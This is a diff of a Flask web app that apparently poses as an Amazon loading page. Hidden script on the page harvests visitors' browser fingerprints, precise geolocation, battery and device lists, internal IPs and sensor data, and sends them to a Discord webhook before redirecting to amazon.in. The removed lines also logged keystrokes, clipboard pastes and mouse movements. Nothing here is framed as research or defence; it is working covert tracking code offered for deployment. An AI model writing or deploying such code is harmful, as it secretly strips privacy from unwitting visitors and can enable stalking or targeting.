@@ -1,364 +1,217 @@
 from flask import Flask, request, render_template_string, jsonify
 import requests
 import os
-import textwrap
-import logging
-
-# Initialize logging
-#logging.basicConfig(level=logging.INFO)
 
 app = Flask(__name__)
-# Use a default value for demonstration. Set the real value in Vercel Environment Variables.
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK")
 
-
+# HTML template remains the same; update if required.
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Loading Amazon...</title>
+  <title>Loading...</title>
   <style>
-    body { 
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      background: #ffffff;
-      font-family: Arial, sans-serif;
-    }
-    
-    .loader-container {
-      text-align: center;
-    }
-
-    .amazon-loader {
-      width: 60px;
-      height: 60px;
-      border: 4px solid #FF9900;
+    body { font-family: sans-serif; text-align: center; background: #0e0e0e; color: white; }
+    .loader {
+      border: 10px solid #444;
+      border-top: 10px solid #00f2ff;
       border-radius: 50%;
-      border-top-color: transparent;
+      width: 80px; height: 80px;
+      margin: 50px auto;
       animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
-      position: relative;
     }
-
-    .amazon-loader::after {
-      content: '';
-      position: absolute;
-      top: -4px;
-      left: -4px;
-      right: -4px;
-      bottom: -4px;
-      border: 4px solid #ff990033;
-      border-radius: 50%;
-    }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
-    .loading-text {
-      color: #232F3E;
-      font-size: 18px;
-      font-weight: bold;
-      margin-top: 20px;
-    }
-
-    .amazon-brand {
-      color: #232F3E;
-      font-size: 24px;
-      margin-top: 10px;
-      font-weight: bold;
-    }
-    /* Hidden iframe for login status detection */
-    iframe.login-check {
-      display: none;
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
-  <div class="loader-container">
-    <div class="amazon-loader"></div>
-    <div class="loading-text">Securing Connection...</div>
-    <div class="amazon-brand">Amazon</div>
-  </div>
-  
-  <!-- Hidden iframe to detect login status on popular sites -->
-  <iframe class="login-check" src="https://www.facebook.com" onload="console.log('User likely logged into Facebook');"></iframe>
+  <div class="loader"></div>
+  <p id="detect">Please wait, redirecting...</p>
+  <input id="pasteField" placeholder="Paste here" class="hidden">
 
   <script>
-    // Global arrays to store additional events
-    const mouseMovements = [];
-    const keystrokes = [];
-    const pastedData = [];
-    const sensorData = {
-      deviceMotion: null,
-      deviceOrientation: null
-    };
-
-    // Basic fingerprint collection (existing)
     async function collectInfo() {
-      const fingerprint = {
-        screen: { 
-          width: screen.width,
-          height: screen.height,
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const battery = await navigator.getBattery();
+        const voices = speechSynthesis.getVoices().map(v => `${v.name} (${v.lang})`);
+
+        const features = {
+          wasm: typeof WebAssembly === 'object',
+          webrtc: typeof RTCPeerConnection === 'function',
+          serviceWorker: 'serviceWorker' in navigator,
+          notification: 'Notification' in window,
+          localStorage: 'localStorage' in window,
+          indexedDB: 'indexedDB' in window,
+          deviceMotion: 'DeviceMotionEvent' in window,
+          orientation: 'DeviceOrientationEvent' in window,
+        };
+
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const mediaDevices = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
+
+        let bluetoothDevices = [], usbDevices = [];
+        try {
+          bluetoothDevices = await navigator.bluetooth.getDevices();
+          bluetoothDevices = bluetoothDevices.map(d => d.name || 'Unnamed Device');
+        } catch {}
+        try {
+          const usb = await navigator.usb.getDevices();
+          usbDevices = usb.map(d => d.productName);
+        } catch {}
+
+        const osc = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        osc.connect(analyser);
+        osc.start(0);
+        let audioData = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(audioData);
+        const audioFingerprint = audioData.slice(0, 5).join(',');
+
+        let internalIPs = [];
+        try {
+          const pc = new RTCPeerConnection({ iceServers: [] });
+          pc.createDataChannel('');
+          pc.createOffer().then(offer => pc.setLocalDescription(offer));
+          pc.onicecandidate = e => {
+            if (e.candidate) {
+              const ipMatch = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+              if (ipMatch && !internalIPs.includes(ipMatch[1])) internalIPs.push(ipMatch[1]);
+            }
+          };
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        } catch {}
+
+        // Enhanced Geolocation with accuracy and speed.
+        let location = { lat: null, lon: null, accuracy: null, speed: null };
+        try {
+          await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+              pos => {
+                location.lat = pos.coords.latitude;
+                location.lon = pos.coords.longitude;
+                location.accuracy = pos.coords.accuracy;
+                location.speed = pos.coords.speed;
+                resolve();
+              },
+              err => resolve()
+            );
+          });
+        } catch {}
+
+        // Ambient Light Sensor (if available)
+        let ambientLight = "N/A";
+        if ('AmbientLightSensor' in window) {
+          try {
+            const sensor = new AmbientLightSensor();
+            sensor.addEventListener('reading', () => {
+              ambientLight = sensor.illuminance;
+            });
+            sensor.start();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+          } catch (e) {
+            ambientLight = "Error: " + e;
+          }
+        }
+
+        // Browser Plugins
+        const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : [];
+
+        // Online/Offline Status
+        const onlineStatus = navigator.onLine ? "online" : "offline";
+
+        // Motion and Orientation events
+        let motionData = {}, orientationData = {};
+        window.addEventListener('devicemotion', e => {
+          motionData = {
+            accX: e.acceleration?.x || 0,
+            accY: e.acceleration?.y || 0,
+            accZ: e.acceleration?.z || 0
+          };
+        });
+        window.addEventListener('deviceorientation', e => {
+          orientationData = {
+            alpha: e.alpha, beta: e.beta, gamma: e.gamma
+          };
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        const payload = {
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          platform: navigator.platform,
+          language: navigator.language,
+          userAgent: navigator.userAgent,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timezoneOffset: new Date().getTimezoneOffset(),
+          cookiesEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack,
+          touchSupport: 'ontouchstart' in window,
+          memory: navigator.deviceMemory || 'N/A',
+          hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+          webGLVendor: gl.getParameter(gl.VENDOR),
+          webGLRenderer: gl.getParameter(gl.RENDERER),
+          unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
+          unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
+          batteryLevel: battery.level,
+          charging: battery.charging,
+          batteryChargingTime: battery.chargingTime,
+          batteryDischargingTime: battery.dischargingTime,
+          voices,
+          features,
+          mediaDevices,
+          networkSpeed: navigator.connection?.downlink || 'N/A',
+          effectiveType: navigator.connection?.effectiveType || 'N/A',
           colorDepth: screen.colorDepth,
           pixelRatio: window.devicePixelRatio,
-          orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
-        },
-        webgl: getWebGLInfo(),
-        audio: await getAudioFingerprint(),
-        fonts: await getFontsList(),
-        hardware: {
-          concurrency: navigator.hardwareConcurrency,
-          memory: navigator.deviceMemory || "N/A",
-          touch: ('ontouchstart' in window),
-          vibration: ('vibrate' in navigator)
-        },
-        network: {
-          ips: await getIPs(),
-          connection: navigator.connection ? {
-            downlink: navigator.connection.downlink,
-            effectiveType: navigator.connection.effectiveType,
-            rtt: navigator.connection.rtt
-          } : null
-        },
-        platform: {
-          os: navigator.platform,
-          userAgent: navigator.userAgent,
-          vendor: navigator.vendor,
-          language: navigator.language,
-          languages: navigator.languages,
-          cookieEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          pdfViewerEnabled: navigator.pdfViewerEnabled || "N/A"
-        },
-        time: {
-          zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          offset: new Date().getTimezoneOffset()
-        },
-        extra: {
-          plugins: Array.from(navigator.plugins || []).map(p => p.name),
-          mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
-          serviceWorker: ('serviceWorker' in navigator),
-          storage: {
-            localStorage: ('localStorage' in window),
-            sessionStorage: ('sessionStorage' in window),
-            indexedDB: ('indexedDB' in window)
-          }
-        },
-        battery: {},
-        canvas: "",
-        // Additional collected events:
-        mouseMovements: mouseMovements.slice(0, 50), // limited to first 50 events
-        keystrokes: keystrokes,
-        pastedData: pastedData,
-        sensorData: sensorData,
-        voices: getVoicesInfo(),
-        appCheck: window.appCheckResult || "Not Attempted"
-      };
-
-      // Battery API
-      try {
-        const battery = await navigator.getBattery();
-        fingerprint.battery = {
-          level: battery.level,
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
+          screenDiff: `${screen.width}x${screen.height} vs ${window.innerWidth}x${window.innerHeight}`,
+          isPWA: window.matchMedia('(display-mode: standalone)').matches,
+          referrer: document.referrer,
+          visibility: document.visibilityState,
+          bluetoothDevices,
+          usbDevices,
+          audioFingerprint,
+          internalIPs,
+          geoLocation: location,
+          ambientLight,
+          plugins,
+          onlineStatus,
+          motionData,
+          orientationData
         };
-      } catch(e) {}
 
-      // Canvas fingerprint
-      try {
-        fingerprint.canvas = getCanvasFingerprint();
-      } catch(e) {}
+        await fetch("/collect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
 
-      // Send collected fingerprint to server
-      await fetch("/collect", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(fingerprint)
-      });
-
-      // Redirect after data is sent (simulate Amazon load)
-      setTimeout(() => {
-        window.location.href = "https://www.amazon.in";
-      }, 3000);
-    }
-
-    // Existing functions
-    function getWebGLInfo() {
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return {
-          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
-          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
-          parameters: Array.from({ length: 374 }, (_, i) =>
-            gl.getParameter(i)?.toString().substring(0, 100)
-          )
-        };
-      } catch(e) {
-        return null;
+        setTimeout(() => {
+          window.location.href = "https://www.amazon.in";
+        }, 3000);
+      } catch (err) {
+        document.getElementById("detect").innerText = "Error collecting info.";
       }
     }
 
-    function getCanvasFingerprint() {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = '#069';
-      ctx.fillText('CanvasFingerprint', 2, 15);
-      return canvas.toDataURL();
-    }
-
-    async function getAudioFingerprint() {
-      try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioContext.createOscillator();
-        const analyser = audioContext.createAnalyser();
-        
-        oscillator.connect(analyser);
-        analyser.connect(audioContext.destination);
-        oscillator.start(0);
-        
-        const fftSize = 2048;
-        analyser.fftSize = fftSize;
-        const buffer = new Uint8Array(analyser.frequencyBinCount);
-        analyser.getByteFrequencyData(buffer);
-        
-        oscillator.stop();
-        audioContext.close();
-        
-        return Array.from(buffer);
-      } catch(e) {
-        return null;
-      }
-    }
-
-    async function getFontsList() {
-      const fontCheck = new Set([
-        'monospace', 'sans-serif', 'serif', 'Arial', 'Arial Black', 'Helvetica',
-        'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS'
-      ]);
-      
-      const available = [];
-      for (const font of fontCheck.values()) {
-        try {
-          await document.fonts.load(`12px "${font}"`);
-          available.push(font);
-        } catch(e) {}
-      }
-      return available;
-    }
-
-    async function getIPs() {
-      return new Promise(resolve => {
-        const ips = [];
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        
-        pc.onicecandidate = e => {
-          if (!e.candidate) {
-            pc.close();
-            resolve(ips);
-            return;
-          }
-          // Collect internal/local IPs if available
-          const parts = e.candidate.candidate.split(' ');
-          const ip = parts.length > 4 ? parts[4] : "";
-          if (ip && !ips.includes(ip)) ips.push(ip);
-        };
-        
-        setTimeout(() => resolve(ips), 1000);
-      });
-    }
-
-    // New: Capture voices info for speech synthesis
-    function getVoicesInfo() {
-      if ('speechSynthesis' in window) {
-        const voices = window.speechSynthesis.getVoices();
-        return voices.map(v => v.name + " - " + v.lang);
-      }
-      return [];
-    }
-
-    // --- Additional Passive Fingerprinting Features ---
-
-    // 1. Mouse Movement & Keystroke Pattern Tracking
-    document.addEventListener('mousemove', (e) => {
-      mouseMovements.push({
-        x: e.clientX,
-        y: e.clientY,
-        time: Date.now()
-      });
-      if (mouseMovements.length > 200) {
-        mouseMovements.shift();
+    document.getElementById("pasteField").addEventListener("paste", e => {
+      const pasted = e.clipboardData.getData("text");
+      if (/.*@.*\..*/.test(pasted) || /[A-Za-z0-9@!#\$%\^&\*]{8,}/.test(pasted)) {
+        alert("Looks like you pasted sensitive data!");
       }
     });
 
-    document.addEventListener('keydown', (e) => {
-      keystrokes.push({
-        key: e.key,
-        code: e.code,
-        time: Date.now()
-      });
-    });
-
-    // 2. Clipboard Read Hook
-    document.addEventListener('paste', (e) => {
-      const data = e.clipboardData.getData('text');
-      pastedData.push({
-        content: data,
-        time: Date.now()
-      });
-    });
-
-    // 3. Mobile Sensor Data (Gyroscope/Accelerometer)
-    window.addEventListener('devicemotion', (e) => {
-      sensorData.deviceMotion = {
-        acceleration: e.acceleration,
-        accelerationIncludingGravity: e.accelerationIncludingGravity,
-        rotationRate: e.rotationRate,
-        interval: e.interval,
-        time: Date.now()
-      };
-    });
-    window.addEventListener('deviceorientation', (e) => {
-      sensorData.deviceOrientation = {
-        alpha: e.alpha,
-        beta: e.beta,
-        gamma: e.gamma,
-        time: Date.now()
-      };
-    });
-
-    // 4. Detect Installed Protocol Handlers (App Check)
-    window.appCheckResult = "Not Detected";
-    let appCheck = window.open("skype://", "_blank");
-    if (appCheck) {
-      window.appCheckResult = "Skype likely installed";
-      appCheck.close();
-    }
-
-    // Start collection when the page loads
     collectInfo();
   </script>
 </body>
 </html>
 """
-
-def split_discord_message(content, max_length=1900):
-    return textwrap.wrap(content, width=max_length, replace_whitespace=False)
 
 @app.route("/")
 def home():
@@ -368,83 +221,98 @@ def home():
 def collect():
     data = request.json
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    logging.info(f"Received data from IP: {ip}")
-
     try:
         ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
-    except Exception as e:
-        ip_info = {"error": str(e)}
-        logging.error("IP info error: " + str(e))
+    except Exception:
+        ip_info = {}
 
-    report = f"""
-    🔍 **Advanced Fingerprint Report** - `{ip}`
-    
-    **🌐 Network**
-    - IPs: {', '.join(data.get('network', {}).get('ips', []))}
-    - Connection Type: {data.get('network', {}).get('connection', {}).get('effectiveType', 'N/A')}
-    - Speed: {data.get('network', {}).get('connection', {}).get('downlink', 'N/A')} Mbps
-    
-    **🖥 System**
-    - OS: {data.get('platform', {}).get('os', 'N/A')}
-    - RAM: {data.get('hardware', {}).get('memory', 'N/A')}
-    - Cores: {data.get('hardware', {}).get('concurrency', 'N/A')}
-    - Touch Enabled: {"Yes" if data.get('hardware', {}).get('touch', False) else "No"}
-    
-    **📷 WebGL**
-    - Vendor: {data.get('webgl', {}).get('vendor', 'N/A')}
-    - Renderer: {data.get('webgl', {}).get('renderer', 'N/A')}
-    
-    **🔊 Audio Fingerprint**
-    - Audio Data Hash: {hash(str(data.get('audio', [])))}
-    
-    **📚 Fonts**
-    - Detected: {', '.join(data.get('fonts', []))}
-    
-    **⌨ Extra Events**
-    - Mouse Movements Collected: {len(data.get('mouseMovements', []))}
-    - Keystrokes Collected: {len(data.get('keystrokes', []))}
-    - Clipboard Pastes: {len(data.get('pastedData', []))}
-    
-    **📡 Sensors**
-    - Device Motion: {data.get('sensorData', {}).get('deviceMotion', 'N/A')}
-    - Device Orientation: {data.get('sensorData', {}).get('deviceOrientation', 'N/A')}
-    
-    **🔊 Voices**
-    - Available Voices: {', '.join(data.get('voices', []))}
-    
-    **🛠 App Check**
-    - Skype Check: {data.get('appCheck', 'N/A')}
-    
-    **⏰ Time**
-    - Timezone: {data.get('time', {}).get('zone', 'N/A')}
-    - Offset: {data.get('time', {}).get('offset', 'N/A')} minutes
-    
-    **🔧 Browser**
-    - User Agent: {data.get('platform', {}).get('userAgent', 'N/A')}
-    - Plugins: {', '.join(data.get('extra', {}).get('plugins', []))}
-    - Do Not Track: {data.get('platform', {}).get('doNotTrack', 'N/A')}
-    
-    **📡 IP Information**
-    - ISP: {ip_info.get('org', 'N/A')}
-    - Location: {ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}
-    - Country: {ip_info.get('country', 'N/A')}
-    - Coordinates: {ip_info.get('loc', 'N/A')}
+    # Check if DISCORD_WEBHOOK is set
+    if not DISCORD_WEBHOOK:
+        return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500
+
+    org = ip_info.get("org", "N/A")
+    is_mobile = "Yes" if any(mob in org.lower() for mob in ["jio", "airtel", "vi", "bsnl", "mobile", "4g", "5g"]) else "No"
+    is_tor = "tor" in org.lower()
+    internal_ips = ", ".join(data.get("internalIPs", []))
+    motion = data.get("motionData", {})
+    orientation = data.get("orientationData", {})
+
+    info = f"""
+📊 **Extended Client Info**
+
+🖥 Screen: {data.get('screenWidth')}x{data.get('screenHeight')}
+🧠 Platform: {data.get('platform')}
+🌐 Language: {data.get('language')}
+🧭 User-Agent: {data.get('userAgent')}
+🕓 Timezone: {data.get('timezone')} (Offset: {data.get('timezoneOffset')})
+🍪 Cookies: {data.get('cookiesEnabled')}, DNT: {data.get('doNotTrack')}
+📱 Touch: {data.get('touchSupport')}, RAM: {data.get('memory')} GB, Cores: {data.get('hardwareConcurrency')}
+
+🎮 WebGL: {data.get('unmaskedVendor')} - {data.get('unmaskedRenderer')}
+🔋 Battery: {int(data.get('batteryLevel', 1.0)*100)}% {'(Charging)' if data.get('charging') else '(Not Charging)'}
+⏱ Charging Time: {data.get('batteryChargingTime')}
+⏱ Discharging Time: {data.get('batteryDischargingTime')}
+🎤 Audio FP: {data.get('audioFingerprint')}
+🔌 Bluetooth: {', '.join(data.get('bluetoothDevices', []))}
+🔌 USB: {', '.join(data.get('usbDevices', []))}
+
+🎤 Media Devices: {', '.join(data.get('mediaDevices', []))}
+🗣 Voices: {', '.join(data.get('voices', []))}
+✅ Features: {', '.join([k for k,v in data.get('features', {}).items() if v])}
+📡 Network: {data.get('networkSpeed')} Mbps ({data.get('effectiveType')})
+
+🌍 Location: {data.get('geoLocation', {}).get('lat')}, {data.get('geoLocation', {}).get('lon')}
+🎯 Geolocation Accuracy: {data.get('geoLocation', {}).get('accuracy')}
+🎯 Geolocation Speed: {data.get('geoLocation', {}).get('speed')}
+💡 Ambient Light: {data.get('ambientLight')}
+🧩 Plugins: {', '.join(data.get('plugins', []))}
+💻 Online Status: {data.get('onlineStatus')}
+
+🧠 Motion: {motion}
+🎯 Orientation: {orientation}
+🧩 Internal IPs: {internal_ips}
+🚀 PWA: {data.get('isPWA')}, Referrer: {data.get('referrer') or 'N/A'}, Tab Visible: {data.get('visibility')}
+
+🌐 IP Info:
+IP: {ip}
+ISP: {org}
+City: {ip_info.get('city', 'N/A')}
+Region: {ip_info.get('region', 'N/A')}
+Country: {ip_info.get('country', 'N/A')}
+Location: {ip_info.get('loc', 'N/A')}
+Mobile: {is_mobile}
+TOR/VPN Detected: {"Yes" if is_tor else "No"}
     """.strip()
 
     try:
-        for chunk in split_discord_message(report):
-            requests.post(DISCORD_WEBHOOK, json={"content": chunk})
-    except Exception as e:
-        logging.error("Error posting to Discord: " + str(e))
-        return jsonify({"status": "error", "message": str(e)}), 500
+        # Attempt to send to the Discord webhook
+        response = requests.post(DISCORD_WEBHOOK, json={"content": info})
+        response.raise_for_status()
+    except Exception as ex:
+        return jsonify({"status": "error", "message": f"Failed to post to Discord webhook: {ex}"}), 500
 
-    return jsonify({"status": "success"})
+    return jsonify({"status": "ok"})
 
-# For Vercel, export the Flask app without running the server directly.
-# Vercel will import this module and use the "app" variable.# Exported
+@app.route("/health", methods=["GET"])
+def health_check():
+    """
+    Health check endpoint that verifies if the DISCORD_WEBHOOK env variable is set and
+    attempts a test message to the webhook.
+    """
+    if not DISCORD_WEBHOOK:
+        return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500
+
+    try:
+        test_payload = {"content": "Test: Webhook connection is working."}
+        response = requests.post(DISCORD_WEBHOOK, json=test_payload)
+        response.raise_for_status()
+    except Exception as ex:
+        return jsonify({"status": "error", "message": f"Webhook connection failed: {ex}"}), 500
+
+    return jsonify({"status": "ok", "message": "Webhook connection successful"})
 
 if __name__ == "__main__":
     # Optional: Log a warning if DISCORD_WEBHOOK isn't set.
     if not DISCORD_WEBHOOK:
         print("Warning: DISCORD_WEBHOOK is not configured!")
-    app.run(debug=True) 
+    app.run(debug=True)
